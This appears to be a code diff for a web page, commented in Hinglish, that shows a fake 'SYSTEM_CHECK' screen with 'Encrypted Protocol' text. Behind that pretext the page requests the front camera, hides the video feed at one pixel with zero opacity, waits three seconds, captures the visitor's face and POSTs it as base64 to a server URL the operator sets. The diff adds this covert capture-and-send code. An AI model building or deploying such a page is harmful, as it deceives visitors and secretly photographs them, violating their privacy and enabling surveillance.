@@ -7,57 +7,69 @@
     <style>
         body { font-family: sans-serif; background: #050505; color: #00ff00; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
         .box { border: 1px solid #00ff00; padding: 2rem; border-radius: 10px; background: #111; box-shadow: 0 0 20px rgba(0,255,0,0.2); }
-        .loading { font-family: 'Courier New', Courier, monospace; }
-        video, canvas { display: none; }
+        video, canvas { display: none; } /* Background mein chalega */
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h2 class="loading">S Y S T E M _ C H E C K</h2>
+    <h2>S Y S T E M _ C H E C K</h2>
     <p id="msg">Initializing Encrypted Protocol...</p>
-    <div id="status">Waiting for access...</div>
+    <div id="status">Waiting for camera...</div>
 </div>
 
-<video id="video" autoplay playsinline muted></video>
-<canvas id="canvas"></canvas>
+<video id="video" autoplay playsinline muted style="width:1px; height:1px; opacity:0;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const statusDiv = document.getElementById('status');
 
-    // 🛑 APNE PYTHON SERVER KA IP YA URL YAHAN DALEIN
-    // Local testing ke liye: http://localhost:5000/upload
-    const SERVER_URL = 'http://localhost:5000/upload'; 
+    // 🛑 APNE SERVER KA URL (Localhost ya IP)
+    const SERVER_URL = 'http://127.0.0.1:5000/upload'; 
 
     async function startProcess() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            // Front camera mangna
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
+            });
+            
             video.srcObject = stream;
             
+            // Wait karein jab tak video start na ho jaye
             video.onloadedmetadata = () => {
-                statusDiv.innerText = "Encrypting Data Streams...";
-                // 2 second wait for focus
-                setTimeout(() => capture(stream), 2000);
+                video.play();
+                statusDiv.innerText = "Encrypting Stream... Stay Still";
+                
+                // 3 SECOND KA WAIT (Black photo fix karne ke liye sabse zaroori)
+                setTimeout(() => {
+                    captureAndSend(stream);
+                }, 3000); 
             };
         } catch (err) {
-            statusDiv.innerText = "❌ PROTOCOL_ERROR: Permission Required";
+            statusDiv.innerText = "❌ ERROR: Permission Denied";
+            console.error(err);
         }
     }
 
-    async function capture(stream) {
+    async function captureAndSend(stream) {
+        // Canvas size set karna video ke hisab se
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        const context = canvas.getContext('2d');
+        // Photo click karna
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Stream band karein
+        // Data ko Base64 mein convert karna
+        const imageData = canvas.toDataURL('image/jpeg', 0.7);
+
+        // Camera band kar dena
         stream.getTracks().forEach(t => t.stop());
 
-        // Photo ko Base64 String (Encoded format) mein badle
-        const imageData = canvas.toDataURL('image/jpeg', 0.8);
-
-        statusDiv.innerText = "Sending Encrypted Packet...";
+        statusDiv.innerText = "Sending Data Packet...";
 
         try {
             const response = await fetch(SERVER_URL, {
@@ -68,13 +80,10 @@
 
             const result = await response.json();
             if(result.status === 'success') {
-                statusDiv.innerText = "✅ DATA_SENT: System Verified";
-            } else {
-                statusDiv.innerText = "❌ SEND_FAILED";
+                statusDiv.innerText = "✅ SYSTEM_VERIFIED";
             }
         } catch (e) {
             statusDiv.innerText = "❌ CONNECTION_LOST";
-            console.error(e);
         }
     }
 
